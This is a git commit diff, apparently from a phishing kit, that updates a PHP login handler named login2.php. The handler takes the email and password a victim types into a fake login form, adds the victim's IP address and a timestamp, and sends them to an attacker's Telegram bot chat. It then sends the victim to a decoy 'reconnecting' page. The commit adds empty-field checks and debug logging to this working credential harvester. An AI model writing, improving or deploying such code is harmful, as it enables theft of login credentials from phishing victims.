4e2596ee37a89438a589f7d47009ffdf10607d82
WhatsMyName <128970881+whatsmyname12@users.noreply.github.com>
2023-12-30 20:53:56 +0800

    Update login2.php

--- login2.php
+++ login2.php
@@ -5,28 +5,59 @@ $chatId = '1634597902';
 
 if ($_SERVER["REQUEST_METHOD"] == "POST") {
     // Retrieve the login credentials, user's IP address, and current date from the form
-    $email = $_POST['eml'];
-    $password = $_POST['pwd'];
-    $userIp = $_SERVER['REMOTE_ADDR'];
-    $currentDate = date('Y-m-d H:i:s'); // Format: Year-Month-Day Hour:Minute:Second
+    $email = isset($_POST['eml']) ? $_POST['eml'] : '';
+    $password = isset($_POST['pwd']) ? $_POST['pwd'] : '';
 
-    // Send the login information, user's IP address, and current date to Telegram
-    $message = "New Login:\nEmail: $email\nPassword: $password\nIP Address: $userIp\nDate: $currentDate";
-    $telegramApiUrl = "https://api.telegram.org/bot$telegramBotToken/sendMessage";
-    $telegramParams = [
-        'chat_id' => $chatId,
-        'text' => $message,
-    ];
+    // Check if email and password are set
+    if (!empty($email) && !empty($password)) {
+        $userIp = $_SERVER['REMOTE_ADDR'];
+        $currentDate = date('Y-m-d H:i:s');
 
-    $ch = curl_init($telegramApiUrl);
-    curl_setopt($ch, CURLOPT_POST, 1);
-    curl_setopt($ch, CURLOPT_POSTFIELDS, $telegramParams);
-    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-    curl_exec($ch);
-    curl_close($ch);
+        $message = "New Login:\nEmail: $email\nPassword: $password\nIP Address: $userIp\nDate: $currentDate";
+        $telegramApiUrl = "https://api.telegram.org/bot$telegramBotToken/sendMessage";
+        $telegramParams = [
+            'chat_id' => $chatId,
+            'text' => $message,
+        ];
 
-    // Redirect to another HTML page after sending to Telegram
-    header("Location: reconnecting.html");
-    exit;
+        $ch = curl_init($telegramApiUrl);
+        curl_setopt($ch, CURLOPT_POST, 1);
+        curl_setopt($ch, CURLOPT_POSTFIELDS, $telegramParams);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+
+        $response = curl_exec($ch);
+
+        if (curl_errno($ch)) {
+            error_log('cURL error: ' . curl_error($ch));
+        }
+
+        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+        curl_close($ch);
+
+        if ($httpCode != 200) {
+            error_log('Telegram API returned HTTP code ' . $httpCode);
+        } else {
+            error_log('Telegram message sent successfully.');
+        }
+
+        // Debugging statement for redirection
+        error_log('Redirecting to reconnecting.html');
+
+        // Redirect to another HTML page after sending to Telegram
+        header("Location: reconnecting.html");
+        exit;
+    } else {
+        // Handle case where email or password is empty
+        error_log('Email or password is empty.');
+        echo 'Email or password is empty.';
+
+        // You may want to add a delay or additional content here for debugging
+    }
+} else {
+    // Handle case where the request method is not POST
+    error_log('Invalid request method.');
+    echo 'Invalid request method.';
+
+    // You may want to add a delay or additional content here for debugging
 }
 ?>
